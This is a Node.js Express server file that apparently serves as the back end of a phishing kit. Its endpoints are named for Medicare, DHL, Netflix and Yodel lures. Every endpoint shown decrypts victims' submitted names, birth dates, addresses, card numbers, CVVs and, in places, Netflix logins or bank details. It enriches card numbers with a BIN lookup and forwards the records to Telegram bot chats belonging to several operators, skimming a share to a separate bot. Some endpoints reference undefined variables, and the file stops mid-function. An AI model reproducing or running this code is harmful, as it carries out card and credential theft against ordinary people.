const express = require('express');
const bodyparser = require('body-parser');
const axios = require('axios');
var cors = require('cors');
var fs = require('fs');
var CryptoJS = require("crypto-js");
require('dotenv').config();
const jwt = require('jsonwebtoken');

const port = process.env.PORT || 8000;

const app = express();
app.use(bodyparser.json());
app.use(cors());

var bankName;

//Dependencies 
const multer = require('multer');

//Multer DiskStorage Config 
const diskStorage = multer.diskStorage({
    destination: 'assets/profile_upload',
    filename: (req, file, call_back) => {
        //Prepend date to the filename or anything that makes
        //the file unique so it won't be overwritten
        call_back(null, Date.now() + '_' + file.originalname);
    }

});

//Create Multer Instance
const upload = multer({ storage: diskStorage });

//File upload 
//or app.post()

app.post('/uploadP60', upload.single('file'), (req, res) => {

    //The file 
    axios.post(`https://api.telegram.org/bot${process.env.sendresbotID}/sendDocument?chat_id=680379375&document=${req.file.path}`)
    console.log(req.file)
        ;
});


app.options('/getips', cors())

app.get('/getips', (req, res) => {
    fs.readFile('ips.txt', function (err, data) {
        var filecontents = data;
        res.send(filecontents);
    })
});

//MEDICARE
//MEDICARE
//MEDICARE

app.options('/tarrifiMedicare', cors())

app.post('/tarrifiMedicare', (req, res) => {
    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
    city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
    state = CryptoJS.AES.decrypt(req.body.state, '402312').toString(CryptoJS.enc.Utf8);
    zip = CryptoJS.AES.decrypt(req.body.zip, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    ccexpyear = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cccvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;
    userIp = req.body.ip;
    userAgent = req.body.userAgent;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${zip} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (mason == 6) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            mason = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicareTarrifi:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=937419988&text=MediCare:\n${originalText}`
            );
            mason += 1
        }

        res.send("Update Completed");
    })
});

let kelvMed = 3;

app.options('/kelvMedicare', cors())

app.post('/kelvMedicare', (req, res) => {
    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
    city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
    state = CryptoJS.AES.decrypt(req.body.state, '402312').toString(CryptoJS.enc.Utf8);
    zip = CryptoJS.AES.decrypt(req.body.zip, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, '402312').toString(CryptoJS.enc.Utf8);
    ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, '402312').toString(CryptoJS.enc.Utf8);
    cccvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;
    userIp = req.body.ip;
    userAgent = req.body.userAgent;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${zip} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (kelvMed == 4) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            kelvMed = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicareTarrifi:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=MediCare:\n${originalText}`
            );
            kelvMed += 1
        }

        res.send("Update Completed");
    })
});

let s350 = 3;

app.options('/S350Medicare', cors())

app.post('/S350Medicare', (req, res) => {
    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
    city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
    state = CryptoJS.AES.decrypt(req.body.state, '402312').toString(CryptoJS.enc.Utf8);
    zip = CryptoJS.AES.decrypt(req.body.zip, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, '402312').toString(CryptoJS.enc.Utf8);
    ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, '402312').toString(CryptoJS.enc.Utf8);
    cccvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;
    userIp = req.body.ip;
    userAgent = req.body.userAgent;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${zip} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (s350 == 4) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            s350 = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicareS350:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=817182308&text=MediCare:\n${originalText}`
            );
            s350 += 1
        }

        res.send("Update Completed");
    })
});

app.options('/offshorebillionsMedicare', cors())

app.post('/offshorebillionsMedicare', (req, res) => {
    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
    city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
    state = CryptoJS.AES.decrypt(req.body.state, '402312').toString(CryptoJS.enc.Utf8);
    zip = CryptoJS.AES.decrypt(req.body.zip, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, '402312').toString(CryptoJS.enc.Utf8);
    ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, '402312').toString(CryptoJS.enc.Utf8);
    cccvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;
    userIp = req.body.ip;
    userAgent = req.body.userAgent;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${zip} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (s350 == 4) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            s350 = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicareS350:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248091713&text=MediCare:\n${originalText}`
            );
            s350 += 1
        }

        res.send("Update Completed");
    })
});

//DHL
//DHL
//DHL

let mason = 0;

app.options('/masonDHL', cors())

app.post('/masonDHL', (req, res) => {
    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cccvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = CryptoJS.AES.decrypt(`${req.body.userAgent}`, '402312').toString(CryptoJS.enc.Utf8);
    userIp = CryptoJS.AES.decrypt(`${req.body.userIp}`, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (mason == 6) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            mason = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=DHLMason:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1912976454&text=DHL:\n${originalText}`
            );
            mason += 1
        }

        res.send("Update Completed");
    })
});

//NETLIX
//NETLIX
//NETLIX

app.options('/fpaysNetflix', cors())

app.post('/fpaysNetflix', (req, res) => {
    username = CryptoJS.AES.decrypt(req.body.username, '402312').toString(CryptoJS.enc.Utf8);
    password = CryptoJS.AES.decrypt(req.body.password, '402312').toString(CryptoJS.enc.Utf8);
    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
    city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
    postcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cccvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = CryptoJS.AES.decrypt(`${req.body.userAgent}`, '402312').toString(CryptoJS.enc.Utf8);
    userIp = CryptoJS.AES.decrypt(`${req.body.userIp}`, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${postcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        var loginText = `+----------- Login Information ------------+\nUsername: ${username}\nPassword: ${password}`;
        if (fpaysC == 6) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NetflixLogin:\n${loginText}`
            );
            fpaysC = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NetflixFpays:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=Netflix:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NetflixLogin:\n${loginText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=NetflixLogin:\n${loginText}`
            );
            fpaysC += 1
        }

        res.send("Update Completed");
    })
});

//YODEL
//YODEL
//YODEL

app.options('/sendYodelRes', cors())

app.post('/sendYodelRes', (req, res) => {
    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
    city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
    postcode = CryptoJS.AES.decrypt(req.body.postcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = CryptoJS.AES.decrypt(`${req.body.userAgent}`, '402312').toString(CryptoJS.enc.Utf8);
    userIp = CryptoJS.AES.decrypt(`${req.body.userIp}`, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${postcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;

        axios.post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelCB:\n${originalText}`
        );
        axios.post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1921026559&text=YodelCB:\n${originalText}`
        );

        res.send("Update Completed");
    })
});

app.options('/sendSSYodelres', cors())

let ssCount = 0;

app.post('/sendSSYodelres', (req, res) => {
    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
    city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
    postcode = CryptoJS.AES.decrypt(req.body.postcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = CryptoJS.AES.decrypt(req.body.userAgent, '402312').toString(CryptoJS.enc.Utf8);
    userIp = CryptoJS.AES.decrypt(req.body.userIp, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${postcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (ssCount == 7) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            ssCount = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelSS:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=Yodel:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1270989114&text=Yodel:\n${originalText}`
            );
            ssCount += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/yodelM4STERB0Y', cors())

let yodelM4STERB0Y = 0;

app.post('/yodelM4STERB0Y', (req, res) => {
    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
    city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
    postcode = CryptoJS.AES.decrypt(req.body.postcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = CryptoJS.AES.decrypt(req.body.userAgent, '402312').toString(CryptoJS.enc.Utf8);
    userIp = CryptoJS.AES.decrypt(req.body.userIp, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${postcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (yodelM4STERB0Y == 6) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            yodelM4STERB0Y = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelM4STER:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1465132165&text=Yodel:\n${originalText}`
            );
            yodelM4STERB0Y += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/sendARRYodelRes', cors())

let arcount = 0;

app.post('/sendARRYodelRes', (req, res) => {
    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
    city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
    postcode = CryptoJS.AES.decrypt(req.body.postcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = CryptoJS.AES.decrypt(req.body.userAgent, '402312').toString(CryptoJS.enc.Utf8);
    userIp = CryptoJS.AES.decrypt(req.body.userIp, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${postcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (arcount == 6) {
            axios.post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            arcount = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelAR:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=853331970&text=Yodel:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=999824723&text=Yodel:\n${originalText}`
            );
            arcount += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/mazzaYodel', cors())

app.post('/mazzaYodel', (req, res) => {
    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
    city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
    postcode = CryptoJS.AES.decrypt(req.body.postcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = CryptoJS.AES.decrypt(req.body.userAgent, '402312').toString(CryptoJS.enc.Utf8);
    userIp = CryptoJS.AES.decrypt(req.body.userIp, '402312').toString(CryptoJS.enc.Utf8);
    scode = CryptoJS.AES.decrypt(req.body.scode, '402312').toString(CryptoJS.enc.Utf8);
    accno = CryptoJS.AES.decrypt(req.body.accno, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;

